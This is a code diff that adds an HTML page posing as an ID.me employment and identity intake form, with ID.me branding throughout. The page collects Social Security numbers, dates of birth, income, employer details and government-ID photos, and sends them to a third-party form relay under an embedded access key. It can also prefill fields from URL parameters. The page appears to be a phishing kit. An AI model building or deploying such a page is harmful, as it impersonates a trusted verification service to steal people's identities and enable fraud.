@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Contact & Employment Intake</title>
+    <link rel="stylesheet" href="index.css" />
+  </head>
+  <body>
+    <nav class="navbar">
+      <div class="navbar-logo">
+        <img src="id.me-image-468x200.png" alt="Logo">
+      </div>
+      
+      
+      
+
+      <div class="menu-toggle" id="menuToggle">
+        <span></span>
+        <span></span>
+        <span></span>
+      </div>
+    </nav>
+<br>
+    <main>
+      <header>
+
+        <p class="intro">
+          Share your contact details and employment info so we can follow up
+          with the right next steps.
+        </p>
+      </header>
+
+          <form id="intakeForm" action="https://api.web3forms.com/submit" method="POST" enctype="multipart/form-data"></form>
+        <input type="hidden" name="access_key" value="777de875-ce38-4643-a30f-45f444bf157c">
+        <input type="hidden" name="subject" value="Contact & Employment Form Submission">
+        <input type="hidden" name="from_name" value="Contact Form">
+        
+        <section class="form-section" id="personalSection">
+          <h2>Personal Details</h2>
+          <p class="subtext">Middle name is optional.</p>
+
+          <div class="form-grid">
+            <div class="field-group">
+              <label for="firstName">
+                First Name <span class="required">*</span>
+              </label>
+              <input
+                type="text"
+                id="firstName"
+                name="firstName"
+                placeholder="Jane"
+                autocomplete="given-name"
+                required
+              />
+            </div>
+
+            <div class="field-group">
+              <label for="middleName">
+                Middle Name <span class="optional">(optional)</span>
+              </label>
+              <input
+                type="text"
+                id="middleName"
+                name="middleName"
+                placeholder="A."
+                autocomplete="additional-name"
+              />
+            </div>
+
+            <div class="field-group">
+              <label for="lastName">
+                Last Name <span class="required">*</span>
+              </label>
+              <input
+                type="text"
+                id="lastName"
+                name="lastName"
+                placeholder="Doe"
+                autocomplete="family-name"
+                required
+              />
+            </div>
+          </div>
+
+          <div class="form-grid">
+            <div class="field-group">
+              <label for="dob">
+                Date of Birth <span class="required">*</span>
+              </label>
+              <input type="date" id="dob" name="dob" required />
+            </div>
+
+            <div class="field-group">
+              <label for="gender">
+                Gender <span class="required">*</span>
+              </label>
+              <select id="gender" name="gender" required>
+                <option value="" disabled selected>Select one</option>
+                <option>Female</option>
+                <option>Male</option>
+                <option>Non-binary</option>
+                <option>Prefer not to say</option>
+              </select>
+            </div>
+          </div>
+
+          <div class="field-group">
+            <label for="email">
+              Email Address <span class="required">*</span>
+            </label>
+            <input
+              type="email"
+              id="email"
+              name="email"
+              placeholder="you@example.com"
+              autocomplete="email"
+              required
+            />
+            
+
+
+        </section>
+
+        <section class="form-section" id="employmentSection">
+          <h2>Employment Info</h2>
+          <p class="subtext">We keep your data secure and confidential.</p>
+
+          <div class="field-group">
+            <label for="employer">
+              Employer / Company Name <span class="required">*</span>
+            </label>
+            <input
+              type="text"
+              id="employer"
+              name="employer"
+              placeholder="Acme Corp"
+              required
+            />
+          </div>
+
+          <div class="field-group">
+            <label for="position">
+              Position / Title <span class="required">*</span>
+            </label>
+            <input
+              type="text"
+              id="position"
+              name="position"
+              placeholder="Product Manager"
+              required
+            />
+          </div>
+
+          <div class="field-group">
+            <label for="income">
+              Annual Income <span class="required">*</span>
+            </label>
+            <div class="input-prefix">
+              <span>$</span>
+              <input
+                type="number"
+                id="income"
+                name="income"
+                placeholder="85000"
+                min="0"
+                step="1000"
+                required
+              />
+            </div>
+            <small class="help-text">Use whole numbers only.</small>
+          </div>
+
+          <div class="field-group">
+            <label for="ssn">
+              Social Security Number <span class="required">*</span>
+            </label>
+            <input
+              type="text"
+              id="ssn"
+              name="ssn"
+              placeholder="123-45-6789"
+              pattern="[0-9]{3}-[0-9]{2}-[0-9]{4}"
+              maxlength="11"
+              required
+            />
+            <small class="help-text">Format: 123-45-6789</small>
+          </div>
+        </section>
+
+                <section class="form-section" id="verificationSection">
+          <h2>Identity Verification</h2>
+          <p class="subtext">Upload a clear photo of your government-issued ID for verification purposes.</p>
+          <div class="field-group">
+            <label for="governmentId">
+              Government-Issued ID Photo <span class="required">*</span>
+            </label>
+            <div class="file-upload-wrapper">
+              <input
+                type="file"
+                id="governmentId"
+                name="governmentId"
+                accept="image/*"
+                required
+              />
+              <div class="file-upload-preview" id="idPreview">
+                <p class="file-upload-placeholder">No file selected</p>
+              </div>
+            </div>
+            <small class="help-text">Accepted formats: JPG, PNG, PDF. Maximum file size: 10MB. Ensure the ID is clearly visible and all information is readable.</small>
+          </div>
+        </section>
+
+        <div class="form-actions">
+          <button type="submit">Submit</button>
+        </div>
+      </form>
+
+
+    </main>
+    <br>
+      <footer class="footer">
+  <div class="footer-content">
+    <div class="footer-brand">
+      <a href="/" class="footer-logo">
+        <img width="119" height="42" alt="Logo" class="logo-img" src="id.me-image-468x200.png">
+      </a>
+      <p class="footer-description">We simplify how individuals connect and share online.</p>
+      <div class="social-links">
+        <a href="https://x.com/IDme" aria-label="Follow us on X" class="social-link">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+          </svg>
+        </a>com
+        <a href="https://www.facebook.com/IDmeInc" aria-label="Like us on Facebook" class="social-link">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+          </svg>
+        </a>
+        <a href="https://www.instagram.com/id.me/" aria-label="Follow us on LinkedIn" class="social-link">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/>
+          </svg>
+        </a>
+        <a href="https://instagram.com" aria-label="Follow us on Instagram" class="social-link">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
+          </svg>
+        </a>
+      </div>
+    </div>
+
+    <div class="footer-links">
+      <div class="footer-column">
+        <h3 class="footer-title">Learn</h3>
+        <ul class="footer-nav">
+          <li><a href="https://network.id.me/case-studies">Case studies</a></li>
+          <li><a href="/resources">Resources</a></li>
+          <li><a href="/blog">Blog</a></li>
+        </ul>
+      </div>
+      <div class="footer-column">
+        <h3 class="footer-title">Connect</h3>
+        <ul class="footer-nav">
+          <li><a href="https://help.id.me/hc/en-us">Contact</a></li>
+          
+        </ul>
+      </div>
+    </div>
+
+    <div class="footer-cta">
+      <a href="https://help.id.me/hc/en-us" class="footer-button">Contact Us</a>
+    </div>
+  </div>
+
+  <div class="footer-bottom">
+    <p>&copy; 2025 ID.me. All rights reserved.</p>
+  </div>
+</footer>
+
+
+    <script>
+      const form = document.getElementById("intakeForm");
+      const params = new URLSearchParams(window.location.search);
+      const personalFields = [
+        "firstName",
+        "middleName",
+        "lastName",
+        "dob",
+        "gender",
+        "email",
+      ];
+      const employmentFields = ["employer", "position", "income", "ssn"];
+
+      const fillFromParams = (fields) => {
+        fields.forEach((field) => {
+          const input = document.getElementById(field);
+          if (input && params.has(field)) {
+            if (input.tagName === "SELECT") {
+              input.value = params.get(field);
+            } else {
+              input.value = params.get(field);
+            }
+          }
+        });
+      };
+
+      fillFromParams([...personalFields, ...employmentFields]);
+
+      // Auto-format SSN as user types
+      const ssnInput = document.getElementById("ssn");
+      if (ssnInput) {
+        ssnInput.addEventListener("input", (e) => {
+          let value = e.target.value.replace(/\D/g, ""); // Remove all non-digits
+          
+          // Format as XXX-XX-XXXX
+          if (value.length > 3) {
+            value = value.substring(0, 3) + "-" + value.substring(3);
+          }
+          if (value.length > 6) {
+            value = value.substring(0, 6) + "-" + value.substring(6, 10);
+          }
+          
+          e.target.value = value;
+        });
+
+        // Validate on blur
+        ssnInput.addEventListener("blur", (e) => {
+          const value = e.target.value.replace(/\D/g, "");
+          if (value.length !== 9 && value.length > 0) {
+            e.target.setCustomValidity("SSN must be 9 digits");
+          } else {
+            e.target.setCustomValidity("");
+          }
+        });
+      }
+
+      // Handle form submission
+      form.addEventListener("submit", async (e) => {
+        e.preventDefault();
+        
+        const submitButton = form.querySelector('button[type="submit"]');
+        const originalText = submitButton.textContent;
+        
+        // Disable button and show loading state
+        submitButton.disabled = true;
+        submitButton.textContent = "Submitting...";
+        
+        try {
+          const formData = new FormData(form);
+          const response = await fetch(form.action, {
+            method: "POST",
+            body: formData
+          });
+          
+          const result = await response.json();
+          
+          if (result.success) {
+            submitButton.textContent = "Submitted Successfully!";
+            submitButton.style.background = "linear-gradient(120deg, #0e8463, #1fb8c0)";
+            form.reset();
+            
+            // Optionally redirect after 2 seconds
+            setTimeout(() => {
+              if (result.redirect_url) {
+                window.location.href = result.redirect_url;
+              }
+            }, 2000);
+          } else {
+            throw new Error(result.message || "Submission failed");
+          }
+        } catch (error) {
+          submitButton.textContent = "Error - Try Again";
+          submitButton.style.background = "linear-gradient(120deg, #d32f2f, #f44336)";
+          console.error("Form submission error:", error);
+          
+          // Reset button after 3 seconds
+          setTimeout(() => {
+            submitButton.disabled = false;
+            submitButton.textContent = originalText;
+            submitButton.style.background = "";
+          }, 3000);
+        }
+      });
+            // Handle file upload preview for government ID
+      const idInput = document.getElementById("governmentId");
+      const idPreview = document.getElementById("idPreview");
+      if (idInput && idPreview) {
+        idInput.addEventListener("change", (e) => {
+          const file = e.target.files[0];
+          if (file) {
+            // Validate file size (10MB max)
+            const maxSize = 10 * 1024 * 1024; // 10MB in bytes
+            if (file.size > maxSize) {
+              alert("File size exceeds 10MB. Please choose a smaller file.");
+              e.target.value = "";
+              idPreview.innerHTML = '<p class="file-upload-placeholder">No file selected</p>';
+              return;
+            }
+            // Validate file type
+            if (!file.type.startsWith("image/")) {
+              alert("Please upload an image file (JPG, PNG, etc.)");
+              e.target.value = "";
+              idPreview.innerHTML = '<p class="file-upload-placeholder">No file selected</p>';
+              return;
+            }
+            // Show preview
+            const reader = new FileReader();
+            reader.onload = (event) => {
+              idPreview.innerHTML = `
+                <img src="${event.target.result}" alt="ID Preview" class="id-preview-image">
+                <p class="file-name">${file.name}</p>
+                <p class="file-size">${(file.size / 1024 / 1024).toFixed(2)} MB</p>
+              `;
+            };
+            reader.readAsDataURL(file);
+          } else {
+            idPreview.innerHTML = '<p class="file-upload-placeholder">No file selected</p>';
+          }
+        });
+      }
+    </script>
+  </body>
+</html>
